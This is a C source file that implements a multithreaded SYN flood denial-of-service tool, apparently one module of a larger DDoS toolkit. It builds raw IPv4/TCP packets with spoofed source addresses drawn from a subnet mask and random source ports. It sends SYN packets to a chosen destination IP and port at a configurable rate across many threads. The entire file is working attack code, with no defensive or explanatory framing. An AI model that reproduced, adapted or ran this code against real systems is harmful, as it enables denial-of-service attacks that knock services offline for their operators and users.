#include "header.h"
#include "base/make_ipv4.h"
#include "base/make_tcp.h"
#include "base/subnet_mask.h"
#include "base/time_check.h"
#include "ddos/syn_flood.h"

extern int g_num_threads;

// session counting
uint32_t g_syn_num_total;
uint32_t g_syn_num_generated_in_sec;
// from main()
InputArguments g_syn_input;
uint32_t g_syn_request_per_sec;
// for masking next ip address
MaskingArguments g_syn_now;
// thread
pthread_mutex_t g_syn_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t g_syn_cond = PTHREAD_COND_INITIALIZER;
// time checking
struct timespec g_syn_before_time;
struct timespec g_syn_now_time;

void SynFloodPrintUsage(void)
{
  printf("SYN Flooding Usage : "
      "[Src-IP/mask] [Dest-IP/mask] [Dest-Port] [# requests/s]\n");
  return;
}

void *GenerateSynFlood(void *data)
{
  srand(time(NULL));
  int thread_id = *((int*) data);
  int sock = MakeRawSocket(IPPROTO_TCP);
  clock_t thread_clock;
  while (1) {
    // *** begin of critical section ***
    pthread_mutex_lock(&g_syn_mutex);
    // get now resource
    GetMaskingArguments(&g_syn_input, &g_syn_now);
    // make ipv4 header
    struct iphdr ipv4_h;
    ipv4_h = PrepareEmptyIphdr();
    ipv4_h = IphdrSetProtocol(ipv4_h, IPPROTO_TCP);
    ipv4_h = IphdrSetSrcAddr(ipv4_h, inet_addr(g_syn_now.src));
    ipv4_h = IphdrSetDestAddr(ipv4_h, inet_addr(g_syn_now.dest));
    ipv4_h = IphdrAddSize(ipv4_h, sizeof(struct tcphdr));
    // make tcp header.
    struct tcphdr tcp_h;
    tcp_h = PrepareEmptyTcphdr();
    // set src port number random
    tcp_h = TcphdrSetSrcPort(tcp_h, rand() % 65535 + 1);
    tcp_h = TcphdrSetDestPort(tcp_h, g_syn_now.port);
    tcp_h = TcphdrSetSeq(tcp_h, g_syn_num_total);
    // ***For SYN TCP request, ACK seq should not be provided
    // tcp_h = TcphdrSetAckSeq(tcp_h,35623);
    tcp_h = TcphdrSetSynFlag(tcp_h);
    tcp_h = TcphdrGetChecksum(ipv4_h, tcp_h, NULL, 0);
    // wait a second
    if (g_syn_num_generated_in_sec >= g_syn_request_per_sec) {
      pthread_cond_wait(&g_syn_cond, &g_syn_mutex);
    }
    // time checking
    TimeCheck(
        &g_syn_cond,
        &g_syn_before_time,
        &g_syn_now_time,
        &g_syn_num_generated_in_sec);
    // make and send packet
    char *packet = AssembleIphdrWithData(ipv4_h, &tcp_h, sizeof(tcp_h));
    SendPacket(sock, ipv4_h, packet, g_syn_now.port);
    free(packet);
    g_syn_num_generated_in_sec++;
    g_syn_num_total++;
    // *** end of critical section ***
    pthread_mutex_unlock(&g_syn_mutex);
  }
  close(sock);
  return 0;
}

void *SynFloodTimeCheck(void *data)
{
  while (1) {
    pthread_mutex_lock(&g_syn_mutex);
    TimeCheck(
        &g_syn_cond,
        &g_syn_before_time,
        &g_syn_now_time,
        &g_syn_num_generated_in_sec);
    pthread_mutex_unlock(&g_syn_mutex);
  }
  return (NULL);
}

void SynFloodMain(char *argv[])
{
  int argc = 0;
  while (argv[argc] != NULL) {
    argc++;
  }
  if (argc != 4) {
    SynFloodPrintUsage();
    return;
  }
  // get ip address, mask, port
  ArgvToInputArguments(argv, &g_syn_input);
  g_syn_num_generated_in_sec = 0;
  g_syn_num_total = 0;
  memset(&g_syn_before_time, 0, sizeof(struct timespec));
  memset(&g_syn_now_time, 0, sizeof(struct timespec));
  g_syn_request_per_sec = atoi(argv[3]);
  const int num_threads = g_num_threads;
  pthread_t threads[9999];
  int thread_ids[9999];
  int i;
  for (i = 0; i < num_threads; i++) {
    thread_ids[i] = i;
  }
  printf("Sending SYN Flooding requests to %s using %d threads\n",
      g_syn_input.dest, num_threads);

  for (i = 0; i < num_threads; i++) {
    pthread_create(
        &threads[i],
        NULL,
        GenerateSynFlood,
        (void *)&thread_ids[i]);
  }
  pthread_create(&threads[i], NULL, SynFloodTimeCheck, NULL);
  for (i = 0; i < num_threads; i++) {
    pthread_join(threads[i], NULL);
    printf("thread %d joined\n", i);
  }
  pthread_mutex_destroy(&g_syn_mutex);
  printf("SYN Flooding finished\nTotal %lu packets sent.\n",
      g_syn_num_total);
  pthread_exit(NULL);
  return;
}
